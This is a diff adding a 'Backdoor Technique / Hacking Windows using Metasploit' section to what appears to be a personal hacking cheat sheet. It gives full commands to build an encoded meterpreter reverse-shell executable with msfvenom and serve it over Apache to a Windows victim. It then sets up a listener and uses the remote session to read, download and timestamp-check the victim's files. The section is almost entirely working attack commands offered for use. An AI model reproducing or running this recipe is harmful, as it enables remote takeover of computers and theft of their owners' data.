@@ -151,7 +151,61 @@ meterpreter > run vnc [kick starts remote session]
 
 -----------------------------------------------------------------END--------------------------------------------------------------
 
+-----------------------------------Backdoor Technique / Hacking Windows using Metasploit------------------------------------------
+
+~~~~Create the Backdoor.exe
+Kali Linux
+> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<kali_ip> -f exe > /root/Desktop/Backdoor.exe
+
+Kali Linux
+Share the Backdoor.exe
+If you didn't have apache2 installed, type: apt-get install apache2
+
+Copy the Backdoor.exe to the /www/html/share/ folder which will be visible from the web:
+> cp /root/Desktop/Backdoor.exe /var/www/html/share/
+
+Start the Apache services:
+> service apache2 start
+If you didn't have apache2 installed, type: apt-get install apache2
+
+~~~~Set Up a Listener
+Open another Kali Linux terminal
+> msfconsole
+> use multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST <kali_ip>
+> set LPORT 4444
+To start the handler on the background, type:
+> expoit -j -z
+
+~~Switch to Windows Machine
+open firefox http://<kali_ip>/share , download the backdoor.exe and run
+
+~~Switch back to Kali Machine where you had executed the msfconsole commands
+You will find that have a Meterpreter session open in the Metasploit terminal
+Type below commands to prove the hacking.
+meterpreter > sysinfo [should show the target systems information]
+meterpreter > run vnc [kick starts remote session]
+
+To get the user that the server is running as, type:
+> getuid
+
+Access a file
+meterpreter > cd Desktop 
+meterpreter > ls
+meterpreter > cat <file_name>
+
+To view the mace attributes of passwords.txt, type:
+> timestomp <file_name> -v
+> download <file_name>
+
+Locating files with Search
+> search -f pagefile.sys
 
 
+
+
+
+------------------------------------------------------------------END-------------------------------------------------------------
 
 
